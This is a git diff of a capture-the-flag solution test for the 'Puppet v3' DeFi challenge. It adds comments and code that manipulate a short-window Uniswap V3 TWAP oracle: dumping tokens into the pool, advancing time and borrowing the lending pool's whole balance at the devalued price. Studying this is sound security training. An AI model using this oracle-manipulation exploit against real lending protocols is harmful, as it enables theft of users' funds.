@@ -141,32 +141,39 @@ describe('[Challenge] Puppet v3', function () {
         initialBlockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
     });
 
+    /**
+     * @dev
+     * Overview of exploit:
+     *
+     * Exploit is very similar to Puppet-V2 except this uses Uniswap's V3 Time
+     * Weighted Average Price (TWAP) to calculate the price. We also need to
+     * connect to Uniswaps Router to make our lives easier.
+     *
+     * This can be exploited if the TWAP period is short enough that it is still
+     * suseptible to short term violatility, which is exactly what happens here.
+     *
+     * We make a trade buying all WETH in the pool, heavily devaluing the DVT
+     * token relative to the WETH token.
+     *
+     * However if we were to get the price directly after the trade, the price
+     * would still be 1:1 since the new price has a Time Weight of 0.
+     *
+     * So we need to wait a few minutes for the TWAP to move to an appropriate
+     * price (110 seconds) then call the lending pool which then uses the
+     * heavily devalued price
+     */
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-       
-        /**
-         * Initial Bals
-         * Player ETH: 1
-         * PLayer TOK: 110
-         * 
-         * Uniswap Pool ETH: 100
-         * Uniswap Pool TOK: 100
-         * 
-         * LP: 1 000 000
-         * 
-         * Interesting things to look at:
-         *  uniswapPositionManger
-         *  oracleLibrary -> consult
-         * 
-         * Oracle is taken as the arithmatic mean of the last 10 minutes
-         */
+
         const log = console.log;
 
+        // Connect to contracts as attacker
         const attackPool = await uniswapPool.connect(player);
         const attackLendingPool = await lendingPool.connect(player);
         const attackToken = await token.connect(player);
         const attackWeth = await weth.connect(player);
 
+        // Helper function to log balances of addresses
         const logBalances = async (name, address) => {
             const dvt_bal = await attackToken.balanceOf(address);
             const weth_bal = await weth.balanceOf(address);
@@ -180,21 +187,27 @@ describe('[Challenge] Puppet v3', function () {
 
         await logBalances("Player", player.address)
 
+        // Helper function to get quotes from the Lending pool
         const getQuote = async(amount, print=true) => {
             const quote = await attackLendingPool.calculateDepositOfWETHRequired(amount);
             if (print) log(`Quote of ${ethers.utils.formatEther(amount)} DVT is ${ethers.utils.formatEther(quote)} WETH`)
             return quote
         }
 
-        const uniswapRouter = new ethers.Contract("0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", routerJson.abi, player);
-        await attackToken.approve(uniswapRouter.address, ethers.constants.MaxUint256);
+        const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+        log(`Connecting to uniswap router at mainnet address ${uniswapRouterAddress}`)
+        const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);
 
+        log("Approving all player tokens to be taken from the uniswap router");
+        await attackToken.approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        log("Swapping all player tokens for as much WETH as possible.");
         await uniswapRouter.exactInputSingle(
             [attackToken.address,
             weth.address,   
             3000,
             player.address,
-            110n * 10n ** 18n, // 10 DVT TOKENS
+            PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
             0,
             0],
             {
@@ -203,12 +216,23 @@ describe('[Challenge] Puppet v3', function () {
         );
 
         await logBalances("Player", player.address)
-        await logBalances("Pool", attackPool.address)
-        
+        await logBalances("Uniswap Pool", attackPool.address)
+
+        // Increase block time by 100 seconds
+        log("Increasing block time by 100 seconds")
         await time.increase(100);
-        await getQuote(LENDING_POOL_INITIAL_TOKEN_BALANCE);
-        await attackWeth.approve(attackLendingPool.address, ethers.constants.MaxUint256);
+
+        // Get new quote for borrow and approve lending pool for that amount
+        log("Getting new quote and approving lending pool for transfer");
+        const quote = await getQuote(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        await attackWeth.approve(attackLendingPool.address, quote);
+
+        // Borrow the funds
+        log("Borrowing funds");
         await attackLendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        await logBalances("Player", player.address);
+        await logBalances("Lending Pool", attackLendingPool.address)
         
         // Exploit finished
     });
